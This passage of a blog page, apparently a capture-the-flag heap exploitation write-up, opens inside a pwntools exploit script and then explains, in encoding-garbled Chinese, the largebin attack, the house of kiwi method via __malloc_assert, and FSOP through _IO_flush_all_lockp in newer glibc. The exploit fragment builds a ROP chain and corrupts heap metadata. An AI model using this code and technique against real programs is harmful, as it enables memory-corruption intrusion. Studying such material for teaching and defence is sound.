</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="c1">#read(0,flag_addr+0x10,0x100)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="c1">#puts(flag_addr+0x10)
</span>
<span class="c1"># ç¬¬äºŒæ¬¡largebin attack
</span><span class="nf">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span> <span class="c1"># +0x2040 +0x2050
</span><span class="nf">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sh">"</span><span class="s">9999</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21a0e0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1370</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x28e0</span><span class="o">-</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">3</span><span class="p">))</span>
</code></pre></div></div> <h5 id="æœ‰å‡ ç‚¹ç»†èŠ‚éœ€è¦æ³¨æ„">â€ƒâ€ƒâ€ƒæœ‰å‡ ç‚¹ç»†èŠ‚éœ€è¦æ³¨æ„.<br> </h5> <h5 id="ç¬¬ä¸€-è¿™å¥—åŸºäº__malloc_assertçš„æ‰“æ³•åœ¨ç°åœ¨æ›´é«˜ç‰ˆæœ¬çš„glibcä¸­å·²ç»ä¸å¤å­˜åœ¨äº†-å› ä¸º__malloc_assertè¢«åˆ é™¤äº†-ä½†æ˜¯largebin-attackçš„å…¶ä»–æ–¹æ³•-æ¯”å¦‚fsopä¾ç„¶å¯ä»¥">â€ƒâ€ƒâ€ƒç¬¬ä¸€, è¿™å¥—åŸºäº<code class="language-plaintext highlighter-rouge">__malloc_assert</code>çš„æ‰“æ³•åœ¨ç°åœ¨æ›´é«˜ç‰ˆæœ¬çš„glibcä¸­å·²ç»ä¸å¤å­˜åœ¨äº†, å› ä¸º<code class="language-plaintext highlighter-rouge">__malloc_assert</code>è¢«åˆ é™¤äº†, ä½†æ˜¯largebin attackçš„å…¶ä»–æ–¹æ³•, æ¯”å¦‚FSOPä¾ç„¶å¯ä»¥<br> </h5> <h5 id="ç¬¬äºŒ-stderrç»“æ„ä½“æŒ‡é’ˆæœ‰æ—¶ä¸åœ¨libcä¸­-è€Œæ˜¯åœ¨bssæ®µä¸­-å‡ºç°è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯ä½¿ç”¨äº†setvbuf-è€Œä¸æ˜¯setbufæˆ–è€…ä¸ä½¿ç”¨-è¿™æ˜¯å› ä¸ºsetvbufä¼šåœ¨æºæ–‡ä»¶ä¸­ä½¿ç”¨ä¸‰ä¸ªexternå˜é‡æŒ‡é’ˆ-åœ¨é“¾æ¥æ—¶è¢«ldæ”¾å…¥bssæ®µ-è€Œsetbufä½¿ç”¨çš„ä¸‰ä¸ªæŒ‡é’ˆæ”¾åœ¨gotå†…ä½œä¸ºå¤–éƒ¨é“¾æ¥">â€ƒâ€ƒâ€ƒç¬¬äºŒ, stderrç»“æ„ä½“æŒ‡é’ˆæœ‰æ—¶ä¸åœ¨libcä¸­, è€Œæ˜¯åœ¨<code class="language-plaintext highlighter-rouge">.bss</code>æ®µä¸­. å‡ºç°è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯ä½¿ç”¨äº†<code class="language-plaintext highlighter-rouge">setvbuf()</code>, è€Œä¸æ˜¯<code class="language-plaintext highlighter-rouge">setbuf()</code>æˆ–è€…ä¸ä½¿ç”¨. è¿™æ˜¯å› ä¸º<code class="language-plaintext highlighter-rouge">setvbuf()</code>ä¼šåœ¨æºæ–‡ä»¶ä¸­ä½¿ç”¨ä¸‰ä¸ª<code class="language-plaintext highlighter-rouge">extern</code>å˜é‡æŒ‡é’ˆ, åœ¨é“¾æ¥æ—¶è¢«ldæ”¾å…¥<code class="language-plaintext highlighter-rouge">.bss</code>æ®µ; è€Œ<code class="language-plaintext highlighter-rouge">setbuf()</code>ä½¿ç”¨çš„ä¸‰ä¸ªæŒ‡é’ˆæ”¾åœ¨<code class="language-plaintext highlighter-rouge">.got</code>å†…ä½œä¸ºå¤–éƒ¨é“¾æ¥<br> </h5> <h5 id="ç¬¬ä¸‰-ç”±äºlargebin-attackå†™å…¥çš„æ˜¯chunk-headçš„åœ°å€-å†åŠ ä¸Šå‰4ä¸ªå­—é•¿çš„large-binçš„ä¿¡æ¯-æ‰€ä»¥å¯¼è‡´å°†è¿™ä¸ªå †å—çœ‹ä½œä¸€ä¸ªio_file_plusæ—¶-å®ƒçš„_flagå‰8å­—èŠ‚-ä»¥åŠ_io_read_ptr-_io_read_end-_io_read_base-_io_write_base-_io_write_ptrå„å…«ä¸ªå­—èŠ‚å®é™…ä¸Šæ˜¯éš¾ä»¥æ§åˆ¶çš„-é™¤éæœ‰heap-overflowæˆ–è€…uafä¹‹ç±»æ¼æ´-ä½†æ˜¯å³ä½¿è¿™æ ·ä¹Ÿä¸ä¼šå½±å“è¿™ç§æ”»å‡»æ–¹æ³•çš„ä½¿ç”¨">â€ƒâ€ƒâ€ƒç¬¬ä¸‰, ç”±äºlargebin attackå†™å…¥çš„æ˜¯chunk headçš„åœ°å€, å†åŠ ä¸Šå‰4ä¸ªå­—é•¿çš„large binçš„ä¿¡æ¯, æ‰€ä»¥å¯¼è‡´å°†è¿™ä¸ªå †å—çœ‹ä½œä¸€ä¸ªIO_FILE_PLUSæ—¶, å®ƒçš„_flag(å‰8å­—èŠ‚), ä»¥åŠ_IO_read_ptr, _IO_read_end, _IO_read_base, _IO_write_base, _IO_write_ptr(å„å…«ä¸ªå­—èŠ‚)å®é™…ä¸Šæ˜¯éš¾ä»¥æ§åˆ¶çš„, é™¤éæœ‰heap overflowæˆ–è€…UAFä¹‹ç±»æ¼æ´, <em>ä½†æ˜¯å³ä½¿è¿™æ ·ä¹Ÿä¸ä¼šå½±å“è¿™ç§æ”»å‡»æ–¹æ³•çš„ä½¿ç”¨</em>.</h5> <h3 id="fsop">â€ƒFSOP</h3> <h5 id="ä¸€ä¸ªæ¯”è¾ƒå¤è€çš„æ¼æ´ä½†æ˜¯è¿›å…¥è™šè¡¨åç§»æ—¶ä»£ä¹‹åfsopçš„å½¢å¼å‡ºç°äº†ä¸€äº›ä¸åŒ">â€ƒâ€ƒâ€ƒä¸€ä¸ªæ¯”è¾ƒå¤è€çš„æ¼æ´ï¼Œä½†æ˜¯è¿›å…¥â€œè™šè¡¨åç§»æ—¶ä»£â€ä¹‹åFSOPçš„å½¢å¼å‡ºç°äº†ä¸€äº›ä¸åŒ<br> </h5> <h5 id="fsopåˆ©ç”¨çš„ä¸¤ä¸ªéƒ¨åˆ†ç¬¬ä¸€æ˜¯å®ƒçš„è°ƒç”¨é“¾ç¬¬äºŒæ˜¯è§¦å‘fsop">â€ƒâ€ƒâ€ƒFSOPåˆ©ç”¨çš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€æ˜¯å®ƒçš„è°ƒç”¨é“¾ï¼Œç¬¬äºŒæ˜¯è§¦å‘FSOP</h5> <h4 id="è§¦å‘io">â€ƒè§¦å‘IO</h4> <h5 id="åœ¨ä¼ªé€ äº†ç›¸åº”ç»“æ„ä¹‹å-æƒ³è¦è¿›è¡Œfsop-è®©ä¼ªé€ æ•°æ®è¢«ç”¨ä¸Š-éœ€è¦å…ˆè¿›å…¥ioæµ-åœ¨é«˜ç‰ˆæœ¬çš„glibcä¸­-ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼è¿›å…¥ioæµ-_io_flush_all_lockp-ä»¥åŠhouse-of-kiwiæ–¹æ³•-house-of-kiwiæ–¹æ³•å°±æ˜¯ä¸Šé¢çš„__malloc_assertæ–¹æ³•">â€ƒâ€ƒâ€ƒåœ¨ä¼ªé€ äº†ç›¸åº”ç»“æ„ä¹‹å, æƒ³è¦è¿›è¡ŒFSOP, è®©ä¼ªé€ æ•°æ®è¢«ç”¨ä¸Š, éœ€è¦å…ˆè¿›å…¥IOæµ, åœ¨é«˜ç‰ˆæœ¬çš„glibcä¸­, ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼è¿›å…¥IOæµ: <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, ä»¥åŠ<code class="language-plaintext highlighter-rouge">house of kiwi</code>æ–¹æ³•, <code class="language-plaintext highlighter-rouge">house of kiwi</code>æ–¹æ³•å°±æ˜¯ä¸Šé¢çš„<code class="language-plaintext highlighter-rouge">__malloc_assert</code>æ–¹æ³•.</h5> <h4 id="_io_flush_all_lockpæ–¹æ³•">â€ƒ_IO_flush_all_lockp()æ–¹æ³•</h4> <h5 id="è¿™ç§æ–¹æ³•æ˜¯fsopçš„ä¼ ç»Ÿåšæ³•-_io_flush_all_lockpä¼šä»_io_list_allæŸ¥æ‰¾io_fileç»“æ„ä½“-ç„¶ååˆ†åˆ«å¯¹æ¯ä¸ªç»“æ„ä½“flush-è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šä½¿ç”¨è™šè¡¨ä¸­çš„_io_overflow">â€ƒâ€ƒâ€ƒè¿™ç§æ–¹æ³•æ˜¯FSOPçš„ä¼ ç»Ÿåšæ³•, <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>ä¼šä»<code class="language-plaintext highlighter-rouge">_IO_list_all</code>æŸ¥æ‰¾<code class="language-plaintext highlighter-rouge">IO_FILE</code>ç»“æ„ä½“, ç„¶ååˆ†åˆ«å¯¹æ¯ä¸ªç»“æ„ä½“flush, è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šä½¿ç”¨è™šè¡¨ä¸­çš„<code class="language-plaintext highlighter-rouge">_IO_overflow</code><br> </h5> <h5 id="è§¦å‘è¿™ä¸ªå‡½æ•°åˆæœ‰ä¸€äº›åŠæ³•-ä½†æ˜¯åœ¨é«˜ç‰ˆæœ¬glibcä¸­ç å¾—ä¸ƒä¸ƒå…«å…«-åŸºæœ¬åªå‰©ä¸‹ç¨‹åºä½¿ç”¨exité€€å‡ºè¿™ä¸€ç§æ¯”è¾ƒå¸¸è§åˆæ–¹ä¾¿åˆ©ç”¨çš„æ–¹æ³•">â€ƒâ€ƒâ€ƒè§¦å‘è¿™ä¸ªå‡½æ•°åˆæœ‰ä¸€äº›åŠæ³•, ä½†æ˜¯åœ¨é«˜ç‰ˆæœ¬glibcä¸­ç å¾—ä¸ƒä¸ƒå…«å…«, åŸºæœ¬åªå‰©ä¸‹ç¨‹åºä½¿ç”¨<code class="language-plaintext highlighter-rouge">exit()</code>é€€å‡ºè¿™ä¸€ç§æ¯”è¾ƒå¸¸è§åˆæ–¹ä¾¿åˆ©ç”¨çš„æ–¹æ³•<br> </h5> <h5 id="ç²¾ç®€ä»£ç ">â€ƒâ€ƒâ€ƒç²¾ç®€ä»£ç </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">){</span>
  <span class="p">...</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
       <span class="p">...</span>
    <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span>       <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
           <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
                    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="cp">#endif
</span>       <span class="p">)</span>
      <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
           <span class="p">{</span>
               <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="å…¶ä¸­_io_overflowä¼šä½¿ç”¨è™šè¡¨ä¸­0x18å¤„çš„å‡½æ•°-è¿™å°±ç»™æˆ‘ä»¬å¯ä¹˜ä¹‹æœº">â€ƒâ€ƒâ€ƒå…¶ä¸­<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code>ä¼šä½¿ç”¨è™šè¡¨ä¸­<code class="language-plaintext highlighter-rouge">0x18</code>å¤„çš„å‡½æ•°, è¿™å°±ç»™æˆ‘ä»¬å¯ä¹˜ä¹‹æœº<br> </h5> <h5 id="ä¸ºäº†é¿å…çŸ­è·¯-æƒ³è¦æ‰§è¡Œåˆ°_io_overflow-æœ‰ä¸¤ç§é€‰æ‹©æ¡ä»¶">â€ƒâ€ƒâ€ƒä¸ºäº†é¿å…çŸ­è·¯, æƒ³è¦æ‰§è¡Œåˆ°<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code>, æœ‰ä¸¤ç§é€‰æ‹©æ¡ä»¶:</h5> <h5 id="ç¬¬ä¸€ç§">â€ƒâ€ƒâ€ƒç¬¬ä¸€ç§:</h5> <h5 id="1-fp-_mode--0">â€ƒâ€ƒâ€ƒâ€ƒ1. <code class="language-plaintext highlighter-rouge">fp-&gt;_mode &lt;= 0</code> </h5> <h5 id="2-fp-_io_write_ptr--fp-_io_write_base">â€ƒâ€ƒâ€ƒâ€ƒ2. <code class="language-plaintext highlighter-rouge">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> </h5> <h5 id="ç¬¬äºŒç§">â€ƒâ€ƒâ€ƒç¬¬äºŒç§:</h5> <h5 id="1_io_vtable_offsetfp--0">â€ƒâ€ƒâ€ƒâ€ƒ1.<code class="language-plaintext highlighter-rouge">_IO_vtable_offset(fp) == 0</code> </h5> <h5 id="2fp-_mode--0">â€ƒâ€ƒâ€ƒâ€ƒ2.<code class="language-plaintext highlighter-rouge">fp-&gt;_mode &gt; 0</code> </h5> <h5 id="3-fp-_wide_data-_io_write_ptr--fp-_wide_data-_io_write_base">â€ƒâ€ƒâ€ƒâ€ƒ3. <code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> </h5> <h5 id="ä½†æ˜¯åœ¨ä½¿ç”¨largebin-attackçš„æƒ…å†µä¸‹-ç¬¬ä¸€ç§æƒ…å†µå¾ˆéš¾æ»¡è¶³-å› ä¸º_io_write_ptrå’Œ_io_write_baseåœ¨chunkä¸­çš„ä½ç½®æ˜¯fd_nextsizeå’Œbk_nextsizeçš„ä½ç½®">â€ƒâ€ƒâ€ƒä½†æ˜¯åœ¨ä½¿ç”¨largebin attackçš„æƒ…å†µä¸‹, ç¬¬ä¸€ç§æƒ…å†µå¾ˆéš¾æ»¡è¶³, å› ä¸º<code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>å’Œ<code class="language-plaintext highlighter-rouge">_IO_write_base</code>åœ¨chunkä¸­çš„ä½ç½®æ˜¯fd_nextsizeå’Œbk_nextsizeçš„ä½ç½®.<br> </h5> <h5 id="æ‰€ä»¥ä¸€èˆ¬æ˜¯ç¬¬äºŒç§å®ç°èµ·æ¥æ›´æ–¹ä¾¿">â€ƒâ€ƒâ€ƒæ‰€ä»¥ä¸€èˆ¬æ˜¯ç¬¬äºŒç§å®ç°èµ·æ¥æ›´æ–¹ä¾¿<br> </h5> <h5 id="è‡³äºä¹‹å‰ä½¿ç”¨çš„æ¨¡æ¿-åªéœ€è¦æŠŠä¼ªé€ çš„vtable--0x10-æ”¹æˆ-vtabel--0x30å³å¯">â€ƒâ€ƒâ€ƒè‡³äºä¹‹å‰ä½¿ç”¨çš„æ¨¡æ¿, åªéœ€è¦æŠŠä¼ªé€ çš„<code class="language-plaintext highlighter-rouge">vtable + 0x10</code> æ”¹æˆ <code class="language-plaintext highlighter-rouge">vtabel + 0x30</code>å³å¯<br> </h5> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://blog.google/technology/ai/google-gemini-update-flash-ai-assistant-io-2024/" target="_blank" rel="external nofollow noopener">Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://medium.com/@al-folio/displaying-external-posts-on-your-al-folio-blog-b60a1d241a0a?source=rss-17feae71c3c4------2" target="_blank" rel="external nofollow noopener">Displaying External Posts on Your al-folio Blog</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/ONNX/">ONNX-opt day0</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/">å†…æ ¸æ¨¡å—å¼€å‘ç¯å¢ƒåŠè°ƒè¯•</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/C++%E6%80%8E%E4%B9%88UAF/">[æ°´è´´]C++åº”è¯¥æ€ä¹ˆUAF</a> </li> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> Â© Copyright 2025 Leak Box 258. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>